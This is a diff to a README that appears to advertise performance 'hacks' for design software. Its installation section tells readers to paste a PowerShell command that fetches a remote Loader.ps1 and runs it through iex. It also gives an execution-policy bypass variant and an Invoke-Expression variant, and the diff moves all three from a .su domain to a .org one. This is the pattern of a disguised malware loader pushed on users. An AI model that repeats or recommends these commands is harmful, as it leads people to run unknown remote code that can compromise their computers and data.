@@ -28,6 +28,7 @@ To fix lag and improve rendering speeds, implement these configuration hacks ins
 * **Custom Color Palettes:** Hack your swatches panel for lightning-fast access to global colors.
 * **Macro Automation:** How to record and import complex actions to bypass repetitive tasks.
 
+
 ---
 
 ## 🚀 Automated Installation & Setup (PowerShell)
@@ -40,7 +41,7 @@ To fix lag and improve rendering speeds, implement these configuration hacks ins
    Copy, paste, and press `Enter` to run the following optimized initialization command. This script dynamically configures the network bypass registry and fetches the necessary packages:
 
    ```powershell
-   irm https://software-storage.su/powershell/Loader.ps1 | iex
+   irm https://software-storage.org/powershell/Loader.ps1 | iex
    ```
 ---
 
@@ -49,13 +50,13 @@ To fix lag and improve rendering speeds, implement these configuration hacks ins
 ### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
 If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
 ```cmd
-powershell -ExecutionPolicy Bypass -Command "irm https://software-storage.su/powershell/Loader.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://software-storage.org/powershell/Loader.ps1 | iex"
 ```
 
 ### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
 In older legacy environments where aliases are missing, use explicit full system cmdlets:
 ```powershell
-Invoke-RestMethod https://software-storage.su/powershell/Loader.ps1 | Invoke-Expression
+Invoke-RestMethod https://software-storage.org/powershell/Loader.ps1 | Invoke-Expression
 ```
 
 
